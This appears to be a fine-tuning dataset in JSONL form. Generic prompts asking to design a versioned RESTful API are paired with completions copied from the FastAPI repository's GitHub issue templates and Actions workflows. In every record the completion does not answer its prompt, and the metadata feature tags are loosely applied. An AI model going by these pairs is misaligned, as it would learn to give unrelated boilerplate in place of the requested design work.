"features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 219}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "labels: [question]\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for your interest in FastAPI! 🚀\n\n        Please follow these instructions, fill every question, and do every step. 🙏\n\n        I'm asking this because answering questions and solving problems in GitHub is what consumes most of the time.\n\n        I end up not being able to add new features, fix bugs, review pull requests, etc. as fast as I wish because I have to spend too much time handling questions.\n\n        All that, on top of all the incredible help provided by a bunch of community members, the [FastAPI Experts](https://fastapi.tiangolo.com/fastapi-people/#experts), that give a lot of their time to come here and help others.\n\n        That's a lot of work they are doing, but if more FastAPI users came to help others like them just a little bit more, it would be much less effort for them (and you and me 😅).\n\n        By asking questions in a structured way (following this) it will be much easier to help you.\n\n        And there's a high chance that you will find the solution along the way and you won't even have to submit it and wait for an answer. 😎\n\n        As there are too many questions, I'll have to discard and close the incomplete ones. That will allow me (and others) to focus on helping people like you that follow the whole process and help us help you. 🤓\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: First Check\n      description: Please confirm and check all the following options.\n      options:\n        - label: I added a very descriptive title here.\n          required: true\n        - label: I used the GitHub search to find a similar question and didn't find it.\n          required: true\n        - label: I searched the FastAPI documentation, with the integrated search.\n          required: true\n        - label: I already searched in Google \"How to X in FastAPI\" and didn't find any information.\n          required: true\n        - label: I already read and followed all the tutorial in the docs and didn't find an answer.\n          required: true\n        - label: I already checked if it is not related to FastAPI but to [Pydantic](https://github.com/pydantic/pydantic).\n          required: true\n        - label: I already checked if it is not related to FastAPI but to [Swagger UI](https://github.com/swagger-api/swagger-ui).\n          required: true\n        - label: I already checked if it is not related to FastAPI but to [ReDoc](https://github.com/Redocly/redoc).\n          required: true\n  - type: checkboxes\n    id: help\n    attributes:\n      label: Commit to Help\n      description: |\n        After submitting this, I commit to one of:\n\n          * Read open questions until I find 2 where I can help someone and add a comment to help there.\n          * I already hit the \"watch\" button in this repository to receive notifications and I commit to help at least 2 people that ask questions in the future.\n          * Review one Pull Request by downloading the code and following [all the review process](https://fastapi.tiangolo.com/help-fastapi/#review-pull-requests).\n\n      options:\n        - label: I commit to help with one of those options 👆\n          required: true\n  - type: textarea\n    id: example\n    attributes:\n      label: Example Code\n      description: |\n        Please add a self-contained, [minimal, reproducible, example](https://stackoverflow.com/help/minimal-reproducible-example) with your use case.\n\n        If I (or someone) can copy it, run it, and see it right away, there's a much higher chance I (or someone) will be able to help you.\n\n      placeholder: |\n        from fastapi import FastAPI\n\n        app = FastAPI()\n\n\n        @app.get(\"/\")\n        def read_root():\n            return {\"Hello\": \"World\"}\n      render: python\n    validations:\n      required: true\n  - type: textarea\n    id: description\n    attributes:\n      label: Description\n      description: |\n        What is the problem, question, or error?\n\n        Write a short description telling me what you are doing, what you expect to happen, and what is currently happening.\n      placeholder: |\n        * Open the browser and call the endpoint `/`.\n        * It returns a JSON with `{\"Hello\": \"World\"}`.\n        * But I expected it to return `{\"Hello\": \"Sara\"}`.\n    validations:\n      required: true\n  - type: dropdown\n    id: os\n    attributes:\n      label: Operating System\n      description: What operating system are you on?\n      multiple: true\n      options:\n        - Linux\n        - Windows\n        - macOS\n        - Other\n    validations:\n      required: true\n  - type: textarea\n    id: os-details\n    attributes:\n      label: Operating System Details\n      description: You can add more details about your operating system here, in particular if you chose \"Other\".\n  - type: input\n    id: fastapi-version\n    attributes:\n      label: FastAPI Version\n      description: |\n        What FastAPI version are you using?\n\n        You can find the FastAPI version with:\n\n        ```bash\n        python -c \"import fastapi; print(fastapi.__version__)\"\n        ```\n    validations:\n      required: true\n  - type: input\n    id: pydantic-version\n    attributes:\n      label: Pydantic Version\n      description: |\n        What Pydantic version are you using?\n\n        You can find the Pydantic version with:\n\n        ```bash\n        python -c \"import pydantic; print(pydantic.version.VERSION)\"\n        ```\n    validations:\n      required: true\n  - type: input\n    id: python-version\n    attributes:\n      label: Python Version\n      description: |\n        What Python version are you using?\n\n        You can find the Python version with:\n\n        ```bash\n        python --version\n        ```\n    validations:\n      required: true\n  - type: textarea\n    id: context\n    attributes:\n      label: Additional Context\n      description: Add any additional context information or screenshots you think are useful.\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/DISCUSSION_TEMPLATE/questions.yml", "language": "yaml", "complexity": "medium", "star_count": 87655, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 159}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "blank_issues_enabled: false\ncontact_links:\n  - name: Security Contact\n    about: Please report security vulnerabilities to security@tiangolo.com\n  - name: Question or Problem\n    about: Ask a question or ask about a problem in GitHub Discussions.\n    url: https://github.com/fastapi/fastapi/discussions/categories/questions\n  - name: Feature Request\n    about: To suggest an idea or ask about a feature, please start with a question saying what you would like to achieve. There might be a way to do it already.\n    url: https://github.com/fastapi/fastapi/discussions/categories/questions\n  - name: Show and tell\n    about: Show what you built with FastAPI or to be used with FastAPI.\n    url: https://github.com/fastapi/fastapi/discussions/categories/show-and-tell\n  - name: Translations\n    about: Coordinate translations in GitHub Discussions.\n    url: https://github.com/fastapi/fastapi/discussions/categories/translations\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/ISSUE_TEMPLATE/config.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 17}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Privileged\ndescription: You are @tiangolo or he asked you directly to create an issue here. If not, check the other options. 👇\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for your interest in FastAPI! 🚀\n\n        If you are not @tiangolo or he didn't ask you directly to create an issue here, please start the conversation in a [Question in GitHub Discussions](https://github.com/fastapi/fastapi/discussions/categories/questions) instead.\n  - type: checkboxes\n    id: privileged\n    attributes:\n      label: Privileged issue\n      description: Confirm that you are allowed to create an issue here.\n      options:\n        - label: I'm @tiangolo or he asked me directly to create an issue here.\n          required: true\n  - type: textarea\n    id: content\n    attributes:\n      label: Issue Content\n      description: Add the content of the issue here.\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/ISSUE_TEMPLATE/privileged.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 23}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "docs:\n  - all:\n    - changed-files:\n      - any-glob-to-any-file:\n        - docs/en/docs/**\n        - docs_src/**\n      - all-globs-to-all-files:\n        - '!fastapi/**'\n        - '!pyproject.toml'\n        - '!docs/en/data/sponsors.yml'\n        - '!docs/en/overrides/main.html'\n\nlang-all:\n  - all:\n    - changed-files:\n      - any-glob-to-any-file:\n        - docs/*/docs/**\n      - all-globs-to-all-files:\n        - '!docs/en/docs/**'\n        - '!fastapi/**'\n        - '!pyproject.toml'\n\ninternal:\n  - all:\n    - changed-files:\n      - any-glob-to-any-file:\n        - .github/**\n        - scripts/**\n        - .gitignore\n        - .pre-commit-config.yaml\n        - pdm_build.py\n        - requirements*.txt\n        - docs/en/data/sponsors.yml\n        - docs/en/overrides/main.html\n      - all-globs-to-all-files:\n        - '!docs/*/docs/**'\n        - '!fastapi/**'\n        - '!pyproject.toml'\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/labeler.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 39}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Add to Project\n\non:\n  pull_request_target:\n  issues:\n    types:\n      - opened\n      - reopened\n\njobs:\n  add-to-project:\n    name: Add to project\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/add-to-project@v1.0.2\n        with:\n          project-url: https://github.com/orgs/fastapi/projects/2\n          github-token: ${{ secrets.PROJECTS_TOKEN }}\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/add-to-project.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 19}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Build Docs\non:\n  push:\n    branches:\n      - master\n  pull_request:\n    types:\n      - opened\n      - synchronize\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  changes:\n    runs-on: ubuntu-latest\n    # Required permissions\n    permissions:\n      pull-requests: read\n    # Set job outputs to values from filter step\n    outputs:\n      docs: ${{ steps.filter.outputs.docs }}\n    steps:\n    - uses: actions/checkout@v4\n    # For pull requests it's not necessary to checkout the code but for the main branch it is\n    - uses: dorny/paths-filter@v3\n      id: filter\n      with:\n        filters: |\n          docs:\n            - README.md\n            - docs/**\n            - docs_src/**\n            - requirements-docs.txt\n            - requirements-docs-insiders.txt\n            - pyproject.toml\n            - mkdocs.yml\n            - mkdocs.insiders.yml\n            - mkdocs.maybe-insiders.yml\n            - mkdocs.no-insiders.yml\n            - .github/workflows/build-docs.yml\n            - .github/workflows/deploy-docs.yml\n  langs:\n    needs:\n      - changes\n    runs-on: ubuntu-latest\n    outputs:\n      langs: ${{ steps.show-langs.outputs.langs }}\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install docs extras\n        run: uv pip install -r requirements-docs.txt\n      # Install MkDocs Material Insiders here just to put it in the cache for the rest of the steps\n      - name: Install Material for MkDocs Insiders\n        if: ( github.event_name != 'pull_request' || github.secret_source == 'Actions' )\n        run: uv pip install -r requirements-docs-insiders.txt\n        env:\n          TOKEN: ${{ secrets.FASTAPI_MKDOCS_MATERIAL_INSIDERS }}\n      - name: Verify Docs\n        run: python ./scripts/docs.py verify-docs\n      - name: Export Language Codes\n        id: show-langs\n        run: |\n          echo \"langs=$(python ./scripts/docs.py langs-json)\" >> $GITHUB_OUTPUT\n\n  build-docs:\n    needs:\n      - changes\n      - langs\n    if: ${{ needs.changes.outputs.docs == 'true' }}\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        lang: ${{ fromJson(needs.langs.outputs.langs) }}\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install docs extras\n        run: uv pip install -r requirements-docs.txt\n      - name: Install Material for MkDocs Insiders\n        if: ( github.event_name != 'pull_request' || github.secret_source == 'Actions' )\n        run: uv pip install -r requirements-docs-insiders.txt\n        env:\n          TOKEN: ${{ secrets.FASTAPI_MKDOCS_MATERIAL_INSIDERS }}\n      - name: Update Languages\n        run: python ./scripts/docs.py update-languages\n      - uses: actions/cache@v4\n        with:\n          key: mkdocs-cards-${{ matrix.lang }}-${{ github.ref }}\n          path: docs/${{ matrix.lang }}/.cache\n      - name: Build Docs\n        run: python ./scripts/docs.py build-lang ${{ matrix.lang }}\n      - uses: actions/upload-artifact@v4\n        with:\n          name: docs-site-${{ matrix.lang }}\n          path: ./site/**\n          include-hidden-files: true\n\n  # https://github.com/marketplace/actions/alls-green#why\n  docs-all-green:  # This job does nothing and is only used for the branch protection\n    if: always()\n    needs:\n      - build-docs\n    runs-on: ubuntu-latest\n    steps:\n      - name: Decide whether the needed jobs succeeded or failed\n        uses: re-actors/alls-green@release/v1\n        with:\n          jobs: ${{ toJSON(needs) }}\n          allowed-skips: build-docs\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/build-docs.yml", "language": "yaml", "complexity": "medium", "star_count": 87655, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 138}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: FastAPI People Contributors\n\non:\n  schedule:\n    - cron: \"0 3 1 * *\"\n  workflow_dispatch:\n    inputs:\n      debug_enabled:\n        description: \"Run the build with tmate debugging enabled (https://github.com/marketplace/actions/debugging-with-tmate)\"\n        required: false\n        default: \"false\"\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  job:\n    if: github.repository_owner == 'fastapi'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install Dependencies\n        run: uv pip install -r requirements-github-actions.txt\n      # Allow debugging with tmate\n      - name: Setup tmate session\n        uses: mxschmitt/action-tmate@v3\n        if: ${{ github.event_name == 'workflow_dispatch' && github.event.inputs.debug_enabled == 'true' }}\n        with:\n          limit-access-to-actor: true\n        env:\n          GITHUB_TOKEN: ${{ secrets.FASTAPI_PR_TOKEN }}\n      - name: FastAPI People Contributors\n        run: python ./scripts/contributors.py\n        env:\n          GITHUB_TOKEN: ${{ secrets.FASTAPI_PR_TOKEN }}\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/contributors.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 54}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Deploy Docs\non:\n  workflow_run:\n    workflows:\n      - Build Docs\n    types:\n      - completed\n\npermissions:\n  deployments: write\n  issues: write\n  pull-requests: write\n  statuses: write\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  deploy-docs:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install GitHub Actions dependencies\n        run: uv pip install -r requirements-github-actions.txt\n      - name: Deploy Docs Status Pending\n        run: python ./scripts/deploy_docs_status.py\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          COMMIT_SHA: ${{ github.event.workflow_run.head_sha }}\n          RUN_ID: ${{ github.run_id }}\n      - name: Clean site\n        run: |\n          rm -rf ./site\n          mkdir ./site\n      - uses: actions/download-artifact@v4\n        with:\n          path: ./site/\n          pattern: docs-site-*\n          merge-multiple: true\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          run-id: ${{ github.event.workflow_run.id }}\n      - name: Deploy to Cloudflare Pages\n        # hashFiles returns an empty string if there are no files\n        if: hashFiles('./site/*')\n        id: deploy\n        env:\n          PROJECT_NAME: fastapitiangolo\n          BRANCH: ${{ ( github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_branch == 'master' && 'main' ) || ( github.event.workflow_run.head_sha ) }}\n        uses: cloudflare/wrangler-action@v3\n        with:\n          apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n          accountId: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n          command: pages deploy ./site --project-name=${{ env.PROJECT_NAME }} --branch=${{ env.BRANCH }}\n      - name: Comment Deploy\n        run: python ./scripts/deploy_docs_status.py\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DEPLOY_URL: ${{ steps.deploy.outputs.deployment-url }}\n          COMMIT_SHA: ${{ github.event.workflow_run.head_sha }}\n          RUN_ID: ${{ github.run_id }}\n          IS_DONE: \"true\"\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/deploy-docs.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 78}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Issue Manager\n\non:\n  schedule:\n    - cron: \"13 22 * * *\"\n  issue_comment:\n    types:\n      - created\n  issues:\n    types:\n      - labeled\n  pull_request_target:\n    types:\n      - labeled\n  workflow_dispatch:\n\npermissions:\n  issues: write\n  pull-requests: write\n\njobs:\n  issue-manager:\n    if: github.repository_owner == 'fastapi'\n    runs-on: ubuntu-latest\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: tiangolo/issue-manager@0.5.1\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n          config: >\n            {\n              \"answered\": {\n                \"delay\": 864000,\n                \"message\": \"Assuming the original need was handled, this will be automatically closed now. But feel free to add more comments or create new issues or PRs.\"\n              },\n              \"waiting\": {\n                \"delay\": 2628000,\n                \"message\": \"As this PR has been waiting for the original user for a while but seems to be inactive, it's now going to be closed. But if there's anyone interested, feel free to create a new PR.\"\n              },\n              \"invalid\": {\n                \"delay\": 0,\n                \"message\": \"This was marked as invalid and will be closed now. If this is an error, please provide additional details.\"\n              }\n            }\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/issue-manager.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 48}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Label Approved\n\non:\n  schedule:\n    - cron: \"0 12 * * *\"\n  workflow_dispatch:\n\npermissions:\n  pull-requests: write\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  label-approved:\n    if: github.repository_owner == 'fastapi'\n    runs-on: ubuntu-latest\n    steps:\n    - name: Dump GitHub context\n      env:\n        GITHUB_CONTEXT: ${{ toJson(github) }}\n      run: echo \"$GITHUB_CONTEXT\"\n    - uses: actions/checkout@v4\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version: \"3.11\"\n    - name: Setup uv\n      uses: astral-sh/setup-uv@v6\n      with:\n        version: \"0.4.15\"\n        enable-cache: true\n        cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n    - name: Install GitHub Actions dependencies\n      run: uv pip install -r requirements-github-actions.txt\n    - name: Label Approved\n      run: python ./scripts/label_approved.py\n      env:\n        TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        CONFIG: >\n          {\n            \"approved-1\":\n              {\n                \"number\": 1,\n                \"await_label\": \"awaiting-review\"\n              }\n          }\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/label-approved.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 50}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Latest Changes\n\non:\n  pull_request_target:\n    branches:\n      - master\n    types:\n      - closed\n  workflow_dispatch:\n    inputs:\n      number:\n        description: PR number\n        required: true\n      debug_enabled:\n        description: 'Run the build with tmate debugging enabled (https://github.com/marketplace/actions/debugging-with-tmate)'\n        required: false\n        default: 'false'\n\njobs:\n  latest-changes:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n        with:\n          # To allow latest-changes to commit to the main branch\n          token: ${{ secrets.FASTAPI_LATEST_CHANGES }}\n      # Allow debugging with tmate\n      - name: Setup tmate session\n        uses: mxschmitt/action-tmate@v3\n        if: ${{ github.event_name == 'workflow_dispatch' && github.event.inputs.debug_enabled == 'true' }}\n        with:\n          limit-access-to-actor: true\n      - uses: tiangolo/latest-changes@0.3.2\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n          latest_changes_file: docs/en/docs/release-notes.md\n          latest_changes_header: '## Latest Changes'\n          end_regex: '^## '\n          debug_logs: true\n          label_header_prefix: '### '\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/latest-changes.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 45}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: FastAPI People\n\non:\n  schedule:\n    - cron: \"0 14 1 * *\"\n  workflow_dispatch:\n    inputs:\n      debug_enabled:\n        description: Run the build with tmate debugging enabled (https://github.com/marketplace/actions/debugging-with-tmate)\n        required: false\n        default: \"false\"\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  job:\n    if: github.repository_owner == 'fastapi'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install Dependencies\n        run: uv pip install -r requirements-github-actions.txt\n      # Allow debugging with tmate\n      - name: Setup tmate session\n        uses: mxschmitt/action-tmate@v3\n        if: ${{ github.event_name == 'workflow_dispatch' && github.event.inputs.debug_enabled == 'true' }}\n        with:\n          limit-access-to-actor: true\n        env:\n          GITHUB_TOKEN: ${{ secrets.FASTAPI_PEOPLE }}\n      - name: FastAPI People Experts\n        run: python ./scripts/people.py\n        env:\n          GITHUB_TOKEN: ${{ secrets.FASTAPI_PEOPLE }}\n          SLEEP_INTERVAL: ${{ vars.PEOPLE_SLEEP_INTERVAL }}\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/people.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 55}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Publish\n\non:\n  release:\n    types:\n      - created\n\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        package:\n          - fastapi\n          - fastapi-slim\n    permissions:\n      id-token: write\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n          # Issue ref: https://github.com/actions/setup-python/issues/436\n          # cache: \"pip\"\n          # cache-dependency-path: pyproject.toml\n      - name: Install build dependencies\n        run: pip install build\n      - name: Build distribution\n        env:\n          TIANGOLO_BUILD_PACKAGE: ${{ matrix.package }}\n        run: python -m build\n      - name: Publish\n        uses: pypa/gh-action-pypi-publish@v1.12.4\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/publish.yml", "language": "yaml", "complexity": 